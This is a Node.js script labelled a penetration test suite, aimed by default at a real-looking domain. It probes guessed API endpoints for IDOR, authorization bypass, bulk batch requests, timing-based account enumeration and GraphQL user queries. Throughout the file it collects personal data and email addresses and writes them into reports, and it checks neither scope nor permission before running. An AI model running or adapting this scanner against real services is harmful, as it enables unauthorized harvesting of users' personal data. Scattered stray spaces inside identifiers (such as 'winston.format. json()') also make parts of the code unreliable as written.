const axios = require('axios');
const fs = require('fs');
const path = require('path');
const winston = require('winston');
const pLimit = require('p-limit');
const crypto = require('crypto');

// ============================================================
// CONFIGURATION & LOGGER
// ============================================================

const config = {
  baseURL: process.env.TARGET_URL || 'https://www.serve.com',
  timeout: 5000,
  maxParallel: 5, // Rate limiting
  maxRetries: 2,
  delayBetweenRequests: 500, // ms
  exportDir: './reports',
};

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss' }),
    winston.format. json()
  ),
  transports: [
    new winston. transports.Console({
      format: winston.format. simple(),
    }),
    new winston.transports.File({
      filename: path.join(config.exportDir, 'pentest. log'),
    }),
  ],
});

// ============================================================
// PII DETECTION & DATA CLASSIFICATION
// ============================================================

const PII_PATTERNS = {
  email: {
    pattern: /[\w\.-]+@[\w\.-]+\.\w+/g,
    severity: 'HIGH',
    description: 'Email address',
  },
  ssn:  {
    pattern: /\b\d{3}-\d{2}-\d{4}\b/g,
    severity: 'CRITICAL',
    description: 'Social Security Number',
  },
  phone: {
    pattern: /\b\d{3}[-.\s]?\d{3}[-.\s]?\d{4}\b/g,
    severity: 'HIGH',
    description: 'Phone Number',
  },
  creditCard: {
    pattern: /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/g,
    severity: 'CRITICAL',
    description: 'Credit Card Number',
  },
  dob: {
    pattern: /\b(0? [1-9]|1[0-2])[-/](0?[1-9]|[12]\d|3[01])[-/](\d{4}|\d{2})\b/g,
    severity: 'HIGH',
    description: 'Date of Birth',
  },
  apiKey: {
    pattern: /['"]?(api[_-]?key|secret|token|password)['"]?\s*[: =]\s*['"]? [a-zA-Z0-9_-]{20,}['"]? /gi,
    severity: 'CRITICAL',
    description: 'API Key / Secret',
  },
};

const SENSITIVE_FIELDS = [
  'email',
  'password',
  'ssn',
  'dob',
  'phone',
  'credit_card',
  'token',
  'api_key',
  'secret',
  'address',
  'social_security',
  'date_of_birth',
];

class DataClassifier {
  static classifyResponse(data) {
    const findings = [];
    const dataStr = JSON.stringify(data);

    // Check for PII patterns
    Object.entries(PII_PATTERNS).forEach(([piiType, { pattern, severity, description }]) => {
      const matches = dataStr.match(pattern);
      if (matches) {
        findings. push({
          type: piiType,
          severity,
          description,
          instances: matches.length,
          samples: matches.slice(0, 3),
        });
      }
    });

    // Check for sensitive field names
    const fieldNames = Object.keys(data);
    const exposedFields = fieldNames.filter(field =>
      SENSITIVE_FIELDS. some(sensitive => field.toLowerCase().includes(sensitive))
    );

    if (exposedFields.length > 0) {
      findings.push({
        type: 'SENSITIVE_FIELDS_EXPOSED',
        severity: 'HIGH',
        description: 'Sensitive field names detected in response',
        fields: exposedFields,
      });
    }

    return {
      hasPII: findings.length > 0,
      findings,
      dataSize: dataStr.length,
      fieldCount: fieldNames.length,
    };
  }
}

// ============================================================
// AUTHENTICATION TOKEN MANAGER
// ============================================================

class TokenManager {
  constructor() {
    this.tokens = {
      guest: null,
      user: null,
      admin:  null,
      invalid: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid. invalid',
    };
  }

  async obtainTokens(domain) {
    logger.info('[*] Attempting to obtain authentication tokens.. .');

    // Try common login endpoints
    const loginEndpoints = [
      '/login',
      '/api/login',
      '/api/v1/login',
      '/auth/login',
    ];

    for (const endpoint of loginEndpoints) {
      try {
        const response = await axios.post(`${domain}${endpoint}`, {
          email: 'test@example.com',
          password: 'test123',
        }, { timeout: 5000, validateStatus: () => true });

        if (response.data.token || response.data.access_token) {
          this.tokens.user = response.data.token || response.data.access_token;
          logger.info(`[+] Obtained user token from ${endpoint}`);
          return;
        }
      } catch (e) {
        // Continue to next endpoint
      }
    }

    logger.warn('[-] Could not obtain valid tokens - proceeding with unauthenticated tests');
  }

  getAuthHeader(role = 'guest') {
    if (! this.tokens[role]) {
      return {};
    }

    return {
      Authorization: `Bearer ${this.tokens[role]}`,
    };
  }

  getHeaders(role = 'guest') {
    return {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      'Accept': 'application/json',
      'Content-Type': 'application/json',
      ... this.getAuthHeader(role),
    };
  }
}

// ============================================================
// VULNERABILITY SCANNER
// ============================================================

class VulnerabilityScanner {
  constructor(domain, tokenManager) {
    this.domain = domain;
    this.tokenManager = tokenManager;
    this.findings = [];
    this.extractedEmails = new Set();
    this.limiter = pLimit(config.maxParallel);
  }

  // Test 1: IDOR via sequential IDs
  async testIDOR() {
    logger.info('[*] Testing IDOR vulnerabilities...');

    const idorEndpoints = [
      { path: '/api/users/{id}', paramName: 'id' },
      { path: '/api/v1/users/{id}', paramName: 'id' },
      { path: '/api/profile/{id}', paramName: 'id' },
      { path: '/users/{id}', paramName: 'id' },
      { path: '/api/accounts/{id}', paramName: 'id' },
    ];

    const roles = ['guest', 'user', 'admin'];
    const promises = [];

    for (const endpoint of idorEndpoints) {
      for (const role of roles) {
        for (let id = 1; id <= 20; id++) {
          promises.push(
            this.limiter(async () => {
              await this.sleep(config.delayBetweenRequests);
              const url = `${this.domain}${endpoint.path. replace('{id}', id)}`;

              try {
                const response = await axios.get(url, {
                  headers: this.tokenManager.getHeaders(role),
                  timeout: config.timeout,
                  validateStatus: () => true,
                });

                if (response. status === 200) {
                  const classification = DataClassifier.classifyResponse(response.data);

                  if (classification.hasPII) {
                    this. findings.push({
                      type: 'IDOR_VULNERABILITY',
                      severity: 'CRITICAL',
                      role,
                      endpoint:  endpoint.path,
                      userId: id,
                      httpStatus: response.status,
                      piiFound: classification.findings,
                      dataExposed: response.data,
                      timestamp: new Date().toISOString(),
                    });

                    // Extract emails
                    if (response.data.email) {
                      this.extractedEmails. add(response.data.email);
                      logger.info(`[+] IDOR:  Extracted email ${response.data. email} (${role}) at ${endpoint.path}/${id}`);
                    }
                  }
                }
              } catch (err) {
                // Silent fail for rate limits/timeouts
              }
            })
          );
        }
      }
    }

    await Promise.all(promises);
    logger.info(`[*] IDOR testing complete. Found ${this.findings. filter(f => f.type === 'IDOR_VULNERABILITY').length} vulnerabilities. `);
  }

  // Test 2: Authorization bypass (privilege escalation)
  async testAuthorizationBypass() {
    logger.info('[*] Testing authorization bypass.. .');

    const adminEndpoints = [
      '/api/admin',
      '/api/admin/users',
      '/admin/dashboard',
      '/api/v1/admin/all-users',
    ];

    for (const endpoint of adminEndpoints) {
      const roles = ['guest', 'user'];

      for (const role of roles) {
        try {
          const response = await axios.get(`${this.domain}${endpoint}`, {
            headers: this.tokenManager.getHeaders(role),
            timeout: config.timeout,
            validateStatus: () => true,
          });

          if (response. status === 200) {
            const classification = DataClassifier.classifyResponse(response.data);

            if (classification.hasPII) {
              this.findings.push({
                type: 'AUTHORIZATION_BYPASS',
                severity: 'CRITICAL',
                endpoint,
                role,
                piiFound: classification.findings,
                httpStatus: response.status,
                timestamp: new Date().toISOString(),
              });

              logger.warn(`[!] AUTHORIZATION BYPASS: ${role} accessed ${endpoint}`);
            }
          }
        } catch (err) {
          // Endpoint doesn't exist or error
        }
      }
    }
  }

  // Test 3: Batch/Mass Assignment Abuse
  async testBatchAbuse() {
    logger.info('[*] Testing batch endpoint abuse...');

    const batchEndpoints = [
      '/api/users/batch',
      '/api/v1/users/batch',
      '/api/profiles/batch',
    ];

    for (const endpoint of batchEndpoints) {
      try {
        const payload = {
          ids: Array.from({ length: 100 }, (_, i) => i + 1), // Request 100 users at once
        };

        const response = await axios.post(`${this.domain}${endpoint}`, payload, {
          headers: this.tokenManager.getHeaders('guest'),
          timeout: config.timeout,
          validateStatus: () => true,
        });

        if (response.status === 200 && Array.isArray(response.data)) {
          const classification = DataClassifier.classifyResponse(response. data);

          if (classification. hasPII) {
            this.findings.push({
              type: 'BATCH_ABUSE',
              severity: 'CRITICAL',
              endpoint,
              recordsReturned: response.data.length,
              piiFound: classification.findings,
              timestamp: new Date().toISOString(),
            });

            // Extract emails from batch
            response.data.forEach(item => {
              if (item.email) {
                this.extractedEmails.add(item.email);
              }
            });

            logger. warn(`[!] BATCH ABUSE: Retrieved ${response.data.length} records from ${endpoint}`);
          }
        }
      } catch (err) {
        // Endpoint doesn't exist
      }
    }
  }

  // Test 4: Timing-based user enumeration
  async testTimingEnumeration() {
    logger.info('[*] Testing timing-based enumeration...');

    const testEmails = [
      'admin@serve.com',
      'user@serve.com',
      'test@serve.com',
      'nonexistent' + Math.random() + '@serve.com',
    ];

    const timingResults = {};

    for (const email of testEmails) {
      const start = Date.now();
      try {
        await axios.post(`${this.domain}/api/login`, {
          email,
          password: 'wrongpassword' + Math.random(),
        }, {
          timeout: config.timeout,
          validateStatus: () => true,
        });
      } catch (err) {
        // Error expected
      }
      const elapsed = Date.now() - start;
      timingResults[email] = elapsed;

      logger.info(`[*] Timing for ${email}: ${elapsed}ms`);
    }

    // Emails with significantly longer response times likely exist
    const avgTime = Object.values(timingResults).reduce((a, b) => a + b, 0) / testEmails.length;
    const suspiciousEmails = Object.entries(timingResults)
      .filter(([_, time]) => time > avgTime * 1.5)
      .map(([email, _]) => email);

    if (suspiciousEmails.length > 0) {
      this.findings.push({
        type: 'TIMING_ENUMERATION',
        severity: 'MEDIUM',
        suspiciousEmails,
        timingResults,
        timestamp: new Date().toISOString(),
      });

      logger.warn(`[!] TIMING ENUMERATION:  Suspicious emails:  ${suspiciousEmails.join(', ')}`);
    }
  }

  // Test 5: GraphQL Introspection
  async testGraphQLIntrospection() {
    logger.info('[*] Testing GraphQL introspection...');

    const graphqlEndpoints = ['/graphql', '/api/graphql', '/api/v1/graphql'];

    for (const endpoint of graphqlEndpoints) {
      try {
        const introspectionQuery = {
          query: `
            query {
              __schema {
                types {
                  name
                  fields {
                    name
                    type { name }
                  }
                }
              }
            }
          `,
        };

        const response = await axios.post(`${this.domain}${endpoint}`, introspectionQuery, {
          headers: this.tokenManager. getHeaders('guest'),
          timeout: config.timeout,
          validateStatus: () => true,
        });

        if (response.status === 200 && response.data.data) {
          this.findings.push({
            type: 'GRAPHQL_INTROSPECTION_ENABLED',
            severity: 'HIGH',
            endpoint,
            schemaExposed: true,
            timestamp: new Date().toISOString(),
          });

          logger. warn(`[!] GraphQL introspection ENABLED at ${endpoint}`);

          // Try to query all users if schema allows
          const userQuery = {
            query:  `
              query {
                users {
                  id
                  email
                  name
                }
              }
            `,
          };

          const userResponse = await axios.post(`${this.domain}${endpoint}`, userQuery, {
            headers: this. tokenManager.getHeaders('guest'),
            timeout: config.timeout,
          });

          if (userResponse. data.data?. users) {
            userResponse.data.data.users.forEach(user => {
              if (user.email) {
                this.extractedEmails.add(user.email);
              }
            });
          }
        }
      } catch (err) {
        // GraphQL endpoint not available
      }
    }
  }

  // Test 6: Response data analysis
  async testResponseAnalysis() {
    logger.info('[*] Analyzing responses for data leakage...');

    const analysisEndpoints = [
      '/api/users',
      '/api/v1/users',
      '/api/profile',
      '/api/me',
    ];

    for (const endpoint of analysisEndpoints) {
      try {
        const response = await axios.get(`${this.domain}${endpoint}`, {
          headers: this.tokenManager.getHeaders('guest'),
          timeout: config.timeout,
          validateStatus: () => true,
        });

        if (response.status === 200) {
          const classification = DataClassifier.classifyResponse(response.data);

          if (classification.hasPII) {
            this.findings.push({
              type: 'DATA_LEAKAGE',
              severity: 'HIGH',
              endpoint,
              piiFound: classification.findings,
              timestamp: new Date().toISOString(),
            });

            logger.warn(`[!] Data leakage at ${endpoint}:  ${JSON.stringify(classification.findings)}`);

            // Extract emails if present
            if (Array.isArray(response.data)) {
              response.data.forEach(item => {
                if (item.email) this.extractedEmails.add(item.email);
              });
            } else if (response.data.email) {
              this.extractedEmails.add(response.data.email);
            }
          }
        }
      } catch (err) {
        // Endpoint error or not found
      }
    }
  }

  async runAllTests() {
    logger.info('========================================');
    logger.info('Starting Advanced Penetration Test Suite');
    logger.info(`Target: ${this.domain}`);
    logger.info('========================================');

    await this.testIDOR();
    await this.testAuthorizationBypass();
    await this.testBatchAbuse();
    await this.testTimingEnumeration();
    await this.testGraphQLIntrospection();
    await this.testResponseAnalysis();

    logger.info('========================================');
    logger.info(`Test Suite Complete`);
    logger.info(`Total Vulnerabilities Found: ${this.findings.length}`);
    logger.info(`Total Emails Extracted: ${this.extractedEmails.size}`);
    logger.info('========================================');

    return {
      findings: this.findings,
      extractedEmails: Array.from(this.extractedEmails),
    };
  }

  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

// ============================================================
// REPORT GENERATION
// ============================================================

class ReportGenerator {
  static generateReport(results) {
    const timestamp = new Date().toISOString();
    const reportDir = config.exportDir;

    if (!fs.existsSync(reportDir)) {
      fs.mkdirSync(reportDir, { recursive: true });
    }

    // JSON Report
    const jsonReport = {
      timestamp,
      target: config.baseURL,
      summary: {
        totalVulnerabilities: results.findings. length,
        totalEmailsExtracted: results.extractedEmails.length,
        criticalCount: results.findings.filter(f => f.severity === 'CRITICAL').length,
        highCount: results.findings.filter(f => f.severity === 'HIGH').length,
      },
      vulnerabilities: results.findings,
      extractedEmails: results.extractedEmails,
    };

    fs.writeFileSync(
      path.join(reportDir, `report-${timestamp. replace(/:/g, '-')}.json`),
      JSON.stringify(jsonReport, null, 2)
    );

    // CSV Report (Emails)
    const csvHeader = 'Email Address,Discovery Method,Severity\n';
    const csvRows = results.findings
      .filter(f => f. type === 'IDOR_VULNERABILITY' || f.type === 'BATCH_ABUSE')
      .map(f => `${Array.from(results.extractedEmails).join(',')},${f.type},${f.severity}`)
      .join('\n');

    fs.writeFileSync(
      path.join(reportDir, `emails-${timestamp.replace(/:/g, '-')}.csv`),
      csvHeader + csvRows
    );

    logger.info(`[+] Reports generated in ${reportDir}`);
    return jsonReport;
  }
}

// ============================================================
// MAIN EXECUTION
// ============================================================

async function main() {
  const tokenManager = new TokenManager();
  await tokenManager.obtainTokens(config.baseURL);

  const scanner = new VulnerabilityScanner(config.baseURL, tokenManager);
  const results = await scanner.runAllTests();

  const report = ReportGenerator.generateReport(results);

  console.log('\n[+] EXTRACTED EMAILS:');
  console.table(results.extractedEmails);

  console.log('\n[+] VULNERABILITIES FOUND:');
  console.table(results.findings. map(f => ({
    Type: f.type,
    Severity: f.severity,
    Endpoint: f.endpoint,
    Role: f.role || '-',
  })));
}

main().catch(err => {
  logger.error('Fatal error:', err);
  process.exit(1);
});

module.exports = { VulnerabilityScanner, TokenManager, DataClassifier, ReportGenerator };
